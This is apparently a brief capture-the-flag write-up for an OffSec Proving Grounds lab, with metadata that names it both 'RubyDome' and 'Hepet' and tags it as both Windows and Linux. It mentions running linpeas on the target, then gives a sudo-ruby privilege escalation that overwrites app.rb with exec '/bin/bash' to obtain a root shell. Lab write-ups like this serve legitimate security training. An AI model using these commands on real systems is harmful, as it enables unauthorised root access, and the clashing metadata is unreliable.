---
title: RubyDome
date: 2026-01-18T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - proving-grounds
categories:
  - Pentesting
  - Offsec
  - Linux
description: "This guide provides readers with the solution to the Proving Grounds Lab: Hepet"
---


![](Screenshot%202025-12-12%20at%2012.16.25.png)

![](Screenshot%202025-12-12%20at%2012.17.17.png)

There a pwnkit pdf that can be exploited that I found in the description

wget linpeas onto the host, chmod and run it 

![](Screenshot%202025-12-12%20at%2013.19.31.png)

sudo -l 

![](Screenshot%202025-12-12%20at%2014.57.22.png)

`echo 'exec "/bin/bash"' > /home/andrew/app/app.rb`

`sudo /usr/bin/ruby /home/andrew/app/app.rb`

So whats happening here?

- ruby is executing /bin/bash from inside the file that has root privileges 

![](Screenshot%202025-12-12%20at%2014.56.47.png)